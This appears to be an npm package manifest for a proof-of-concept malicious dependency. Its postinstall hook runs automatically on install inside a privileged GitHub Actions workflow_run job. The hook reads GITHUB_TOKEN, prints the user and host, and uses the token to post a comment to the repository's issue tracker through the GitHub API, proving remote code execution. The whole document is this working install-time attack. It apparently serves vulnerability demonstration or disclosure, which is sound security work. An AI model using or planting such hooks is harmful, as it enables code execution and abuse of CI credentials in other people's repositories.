name: gab-poc-npm-dep
description: gab poc dep: postinstall proves privileged RCE

scripts.postinstall: set +e; echo "GAB_RCE_MARKER user=$(id -un) host=$(hostname)"; echo "TOKEN_LEN=${#GITHUB_TOKEN}"; curl -sS -o /tmp/c -w "COMMENT_POST=%{http_code}\n" -X POST -H "Authorization: Bearer $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" -H "Content-Type: application/json" https://api.github.com/repos/$GITHUB_REPOSITORY/issues/2/comments -d "{\"body\":\"RCE-PROOF: postinstall script from an attacker-controlled dependency executed inside the privileged workflow_run job and used the workflow GITHUB_TOKEN.\"}" --max-time 20; head -c 300 /tmp/c
